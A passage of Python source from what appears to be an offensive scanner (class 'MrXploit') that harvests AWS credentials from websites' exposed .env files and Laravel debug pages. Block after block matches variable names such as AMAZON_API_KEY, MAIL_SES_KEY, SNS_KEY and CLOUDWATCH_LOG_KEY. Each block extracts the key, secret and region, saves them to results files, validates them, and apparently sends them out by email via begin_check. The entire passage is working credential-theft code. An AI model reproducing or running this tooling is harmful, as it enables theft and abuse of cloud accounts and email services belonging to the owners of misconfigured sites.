					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AMAZON_API_KEY" in str(text):
				if "AMAZON_API_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAMAZON_API_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAMAZON_API_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AMAZON_API_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AMAZON_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AMAZON_API_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_CLIENT_SECRET_KEY" in str(text):
				if "AWS_CLIENT_SECRET_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_CLIENT_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SERVER_PUBLIC_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_CLIENT_SECRET_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_CLIENT_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SERVER_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "MAIL_SES_KEY" in str(text):
				if "MAIL_SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nMAIL_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nMAIL_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>MAIL_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "MAIL_SES_KEY" in str(text):
				if "MAIL_SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nMAIL_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nMAIL_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>MAIL_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_CLOUD_WATCH_KEY_ID" in str(text):
				if "AWS_CLOUD_WATCH_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_CLOUD_WATCH_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_CLOUD_WATCH_KEY_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_CLOUD_WATCH_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_CLOUD_WATCH_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_CLOUD_WATCH_KEY_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "OC_ACCESS_KEY_ID" in str(text):
				if "OC_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nOC_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nOC_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>OC_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>OC_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>OC_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_QUEUE_KEY" in str(text):
				if "AWS_QUEUE_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_QUEUE_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_QUEUE_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_QUEUE_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_QUEUE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_QUEUE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID" in str(text):
				if "DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nDYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nDYNAMIC_ORGCODE_AWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>DYNAMIC_ORGCODE_AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>DYNAMIC_ORGCODE_AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "# SES_KEY" in str(text):
				if "# SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n# SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n# SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td># SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td># SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td># SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "#SES_KEY" in str(text):
				if "#SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n#SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n#SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>#SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>#SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>#SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SNS_KEY" in str(text):
				if "SNS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSNS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSNS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AMAZON_SNS_ACCESS_KEY" in str(text):
				if "AMAZON_SNS_ACCESS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAMAZON_SNS_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAMAZON_SNS_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AMAZON_SNS_ACCESS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AMAZON_SNS_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AMAZON_SNS_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "S3_AUDIO_ACCESS_KEY" in str(text):
				if "S3_AUDIO_ACCESS_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nS3_AUDIO_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nS3_AUDIO_ACCESS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>S3_AUDIO_ACCESS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>S3_AUDIO_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>S3_AUDIO_ACCESS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "CLOUDWATCH_LOG_KEY" in str(text):
				if "CLOUDWATCH_LOG_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nCLOUDWATCH_LOG_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nCLOUDWATCH_LOG_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>CLOUDWATCH_LOG_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>CLOUDWATCH_LOG_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>CLOUDWATCH_LOG_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SNS_ID" in str(text):
				if "SNS_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSNS_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSNS_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SNS_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SNS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SNS_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "#AWS_ACCESS_KEY_ID" in str(text):
				if "#AWS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n#AWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n#AWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>#AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>#AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>#AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
